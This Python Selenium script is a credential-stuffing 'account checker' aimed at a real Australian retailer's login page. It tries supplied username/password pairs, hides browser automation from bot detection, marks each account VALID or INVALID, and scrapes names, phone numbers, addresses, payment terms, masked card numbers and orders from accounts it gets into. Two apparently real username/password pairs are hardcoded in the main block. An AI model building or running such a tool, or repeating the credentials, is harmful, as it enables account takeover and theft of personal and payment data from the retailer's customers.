#!/usr/bin/env python3
"""
Leader Systems Account Checker - CLI version for testing
"""

import os
import sys
import threading
import time
import re
import json
from datetime import datetime

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException


# ========== CONFIGURATION ==========
LOGIN_URL = "https://leadersystems.com.au/login"
HEADLESS = True
OUTPUT_DIR_DEFAULT = "./leader_results"


# ========== ADAPTIVE SELECTORS ==========
EMAIL_SELECTORS = [
    "input[name='email']", "input[id='email']", "input[type='email']", 
    "//input[@type='email']", "input[name='username']", "input[id='username']"
]
PASSWORD_SELECTORS = [
    "input[name='password']", "input[id='password']", "input[type='password']", 
    "//input[@type='password']", "input[name='pwd']", "input[id='pwd']"
]
SUBMIT_SELECTORS = [
    "button[type='submit']", "input[type='submit']", 
    "//button[contains(text(),'Sign In')]", "//button[contains(text(),'Login')]", 
    ".login-btn", "#login", "button[type='button']"
]


# ========== MAIN CHECKER CLASS ==========
class LeaderChecker:
    def __init__(self, headless=False, verbose=True):
        self.headless = headless
        self.verbose = verbose
        self.driver = None
        self.wait = None
        self.results = []
        
    def log(self, msg):
        if self.verbose:
            print(msg)
    
    def start_driver(self):
        """Initialize Chrome driver"""
        options = webdriver.ChromeOptions()
        if self.headless:
            options.add_argument("--headless=new")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")
        options.add_argument("--disable-software-rasterizer")
        options.add_argument("--disable-extensions")
        options.add_argument("--disable-setuid-sandbox")
        options.add_argument("--disable-web-security")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument("--window-size=1920,1080")
        options.add_argument("--remote-debugging-port=9222")
        options.add_argument("--disable-features=VizDisplayCompositor")
        options.binary_location = "/usr/bin/chromium"
        options.set_capability("goog:loggingPrefs", {"browser": "ALL"})
        
        try:
            self.driver = webdriver.Chrome(options=options)
        except Exception as e:
            # Try with service if the first way fails
            from selenium.webdriver.chrome.service import Service
            service = Service()
            self.driver = webdriver.Chrome(service=service, options=options)
        
        self.driver.set_page_load_timeout(60)
        self.wait = WebDriverWait(self.driver, 20)
        
        # Remove webdriver property
        self.driver.execute_cdp_cmd("Page.addScriptToEvaluateOnNewDocument", {
            "source": "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})"
        })
        
    def close_driver(self):
        """Close the driver"""
        if self.driver:
            try:
                self.driver.quit()
            except:
                pass
            self.driver = None
    
    def find_element_smart(self, selectors, timeout=10):
        """Try multiple selectors until one works"""
        for selector in selectors:
            try:
                if selector.startswith("//"):
                    element = self.wait.until(EC.presence_of_element_located((By.XPATH, selector)))
                elif selector.startswith("."):
                    element = self.wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, selector)))
                elif selector.startswith("#"):
                    element = self.wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, selector)))
                else:
                    element = self.wait.until(EC.presence_of_element_located((By.CSS_SELECTOR, selector)))
                self.log(f"  Found element with: {selector}")
                return element
            except:
                continue
        self.log(f"  ✗ No element found from: {selectors}")
        return None
    
    def find_clickable_smart(self, selectors, timeout=10):
        """Try multiple selectors until one works (clickable)"""
        for selector in selectors:
            try:
                if selector.startswith("//"):
                    element = self.wait.until(EC.element_to_be_clickable((By.XPATH, selector)))
                elif selector.startswith("."):
                    element = self.wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, selector)))
                else:
                    element = self.wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, selector)))
                self.log(f"  Found clickable: {selector}")
                return element
            except:
                continue
        return None
    
    def login(self, email, password):
        """Attempt login with adaptive selector fallbacks"""
        try:
            self.log(f"  Navigating to {LOGIN_URL}")
            self.driver.get(LOGIN_URL)
            time.sleep(3)
            
            page_source = self.driver.page_source[:2000] if len(self.driver.page_source) > 2000 else self.driver.page_source
            self.log(f"  Page title: {self.driver.title}")
            self.log(f"  Current URL: {self.driver.current_url}")
            
            # Clear any existing values and enter email
            email_elem = self.find_element_smart(EMAIL_SELECTORS)
            if email_elem:
                email_elem.clear()
                email_elem.send_keys(email)
                self.log(f"  ✓ Entered email: {email}")
            else:
                self.log(f"  ✗ Email field not found")
                self.log(f"  Page HTML preview: {page_source[:500]}")
                return False
            
            # Enter password
            password_elem = self.find_element_smart(PASSWORD_SELECTORS)
            if password_elem:
                password_elem.clear()
                password_elem.send_keys(password)
                self.log(f"  ✓ Entered password")
            else:
                self.log(f"  ✗ Password field not found")
                return False
            
            time.sleep(1)
            
            # Click submit
            submit_elem = self.find_clickable_smart(SUBMIT_SELECTORS)
            if submit_elem:
                submit_elem.click()
                self.log(f"  ✓ Clicked submit")
            else:
                self.log(f"  ✗ Submit button not found, trying Enter key")
                password_elem.send_keys("\n")
                time.sleep(1)
            
            time.sleep(5)
            
            # Check for login success
            current_url = self.driver.current_url
            page_title = self.driver.title.lower()
            self.log(f"  After login URL: {current_url}")
            self.log(f"  After login title: {page_title}")
            
            # If we're still on login page, login failed
            if "login" in current_url.lower() or "login" in page_title:
                self.log(f"  ✗ Still on login page - login failed")
                
                # Check for error messages
                page_text = self.driver.page_source.lower()
                if "invalid" in page_text or "incorrect" in page_text or "failed" in page_text:
                    self.log(f"  ✗ Invalid credentials detected")
                return False
            
            self.log(f"  ✓ Login appears successful (URL changed)")
            return True
            
        except Exception as e:
            self.log(f"  ✗ Login error: {e}")
            import traceback
            traceback.print_exc()
            return False
    
    def extract_account_data(self):
        """Extract all required fields from account"""
        data = {
            "name": "",
            "phone": "",
            "address": "",
            "payment_terms": "",
            "credit_cards": [],
            "open_orders": [],
            "shipped_orders": []
        }
        
        try:
            time.sleep(2)
            
            # Get page text for searching
            body = self.driver.find_element(By.TAG_NAME, "body")
            body_text = body.text
            page_source = self.driver.page_source
            
            self.log(f"  Page title: {self.driver.title}")
            self.log(f"  Current URL: {self.driver.current_url}")
            
            # Extract payment terms
            data["payment_terms"] = self.extract_payment_terms(body_text)
            self.log(f"  Payment terms: {data['payment_terms']}")
            
            # Extract name, phone, address
            data["name"], data["phone"], data["address"] = self.extract_contact_info(body_text)
            self.log(f"  Name: {data['name']}")
            self.log(f"  Phone: {data['phone']}")
            self.log(f"  Address: {data['address']}")
            
            # Extract credit cards
            data["credit_cards"] = self.extract_credit_cards(page_source)
            self.log(f"  Credit cards: {len(data['credit_cards'])} found")
            
            # Try to find orders
            data["open_orders"] = self.extract_orders(page_source, "open")
            data["shipped_orders"] = self.extract_orders(page_source, "shipped")
            self.log(f"  Open orders: {len(data['open_orders'])}")
            self.log(f"  Shipped orders: {len(data['shipped_orders'])}")
            
        except Exception as e:
            self.log(f"  ✗ Data extraction error: {e}")
            import traceback
            traceback.print_exc()
        
        return data
    
    def extract_payment_terms(self, text):
        """Search page text for payment terms"""
        text_lower = text.lower()
        
        if "cod" in text_lower or "cash on delivery" in text_lower or "cash on del" in text_lower:
            return "COD"
        if "net 30" in text_lower:
            return "30 Days"
        if "net 60" in text_lower:
            return "60 Days"
        if "net 7" in text_lower:
            return "7 Days"
        if "30 day" in text_lower or "30days" in text_lower:
            return "30 Days"
        
        # Look for terms field
        if "terms" in text_lower:
            lines = text.split('\n')
            for i, line in enumerate(lines):
                if "terms" in line.lower():
                    next_lines = lines[i:i+3]
                    for nl in next_lines:
                        if "cod" in nl.lower():
                            return "COD"
                        elif any(x in nl.lower() for x in ["30", "60", "7"]):
                            if not "day" in nl.lower():
                                continue
                            return f"{nl.strip()}"
        
        return "Unknown"
    
    def extract_contact_info(self, text):
        """Extract name, phone, address from page text"""
        name = ""
        phone = ""
        address = ""
        
        lines = text.split('\n')
        
        # Look for phone patterns (Australian)
        phone_pattern = r"(\+?61|0)?[4-9]\d{2}[\s\-]?\d{3}[\s\-]?\d{3}"
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            # Phone
            if not phone:
                phone_match = re.search(phone_pattern, line)
                if phone_match:
                    phone = phone_match.group(0)
            
            # Name - first line that looks like a name
            if not name and len(line) > 2 and len(line) < 50:
                if any(x in line.lower() for x in ["mr", "mrs", "ms", "miss", "sir", "dr"]):
                    name = line
                elif line[0].isupper() and line.replace(" ", "").isalpha():
                    if not any(x in line.lower() for x in ["address", "phone", "email", "order", "account", "home", "welcome"]):
                        name = line
        
        # Address - look for patterns with postcodes
        for line in lines:
            line = line.strip()
            if not line:
                continue
            if re.search(r"\d{4}", line):  # 4-digit postcode
                if not address:
                    address = line
                else:
                    address += ", " + line
                break
            elif any(x in line.lower() for x in ["nsw", "vic", "qld", "sa", "wa", "tas", "act", "nt"]):
                if not address or len(line) > len(address):
                    address = line
        
        return name, phone, address
    
    def extract_credit_cards(self, page_source):
        """Extract credit card info"""
        cards = []
        
        try:
            # Look for masked card patterns
            card_pattern = r"\*{4,}[\s\-]?\d{4}"
            matches = re.findall(card_pattern, page_source)
            
            for match in matches:
                cards.append({
                    "number": match.strip(),
                    "expiry": ""
                })
            
            # Look for Visa/Mastercard patterns
            card_types = r"(visa|mastercard|amex|bankcard)[\s\-]*\*{2,}[\d]{4}"
            matches = re.findall(card_types, page_source, re.IGNORECASE)
            
            for match in matches:
                cards.append({
                    "type": match[0] if isinstance(match, tuple) else match,
                    "number": "",
                    "expiry": ""
                })
            
        except Exception as e:
            self.log(f"    Credit card extraction error: {e}")
        
        return cards
    
    def extract_orders(self, page_source, order_type="open"):
        """Extract orders"""
        orders = []
        
        try:
            # Simple pattern matching
            if "order" in page_source.lower():
                # Try to find order IDs
                order_pattern = r"(?:#)?ORD?-?\d{4,}"
                matches = re.findall(order_pattern, page_source, re.IGNORECASE)
                
                for match in matches[:10]:
                    orders.append({
                        "id": match,
                        "status": "Pending" if order_type == "open" else "Shipped",
                        "amount": "",
                        "products": []
                    })
                    
        except Exception as e:
            self.log(f"    Order extraction error: {e}")
        
        return orders
    
    def run_check(self, email, password):
        """Full check for one account"""
        result = {
            "email": email,
            "password": password,
            "status": "INVALID",
            "payment_terms": "",
            "name": "",
            "phone": "",
            "address": "",
            "credit_cards": [],
            "open_orders": [],
            "shipped_orders": [],
            "timestamp": datetime.now().isoformat()
        }
        
        try:
            self.start_driver()
            self.log(f"\n=== Checking: {email} ===")
            
            success = self.login(email, password)
            
            if success:
                result["status"] = "VALID"
                account_data = self.extract_account_data()
                result.update(account_data)
            else:
                result["status"] = "INVALID"
                
        except Exception as e:
            self.log(f"Error: {e}")
            result["status"] = "ERROR"
        finally:
            self.close_driver()
        
        return result


def test_account(email, password):
    """Test a single account"""
    checker = LeaderChecker(headless=True, verbose=True)
    result = checker.run_check(email, password)
    return result


if __name__ == "__main__":
    print("Leader Systems Account Checker - CLI Mode")
    print(f"Current date: {datetime.now()}")
    
    # Test with provided credentials
    test_cases = [
        ("neopc00", "William_87192"),
        ("astr20", "sAINTS@1965")
    ]
    
    results = []
    for i, (email, password) in enumerate(test_cases):
        print(f"\n{'='*60}")
        print(f"TEST {i+1}: {email}:{password}")
        print(f"{'='*60}")
        
        checker = LeaderChecker(headless=False, verbose=True)
        result = checker.run_check(email, password)
        results.append(result)
        
        print(f"\n=== FINAL RESULT ===")
        print(f"Email: {result['email']}")
        print(f"Status: {result['status']}")
        print(f"Payment Terms: {result['payment_terms']}")
        print(f"Name: {result['name']}")
        print(f"Phone: {result['phone']}")
        print(f"Address: {result['address']}")
        
        if result['status'] == 'VALID':
            print(f"Credit Cards: {result['credit_cards']}")
            print(f"Open Orders: {result['open_orders']}")
            print(f"Shipped Orders: {result['shipped_orders']}")
        
        # Close any open drivers
        checker.close_driver()
        
        print(f"\n{'='*60}")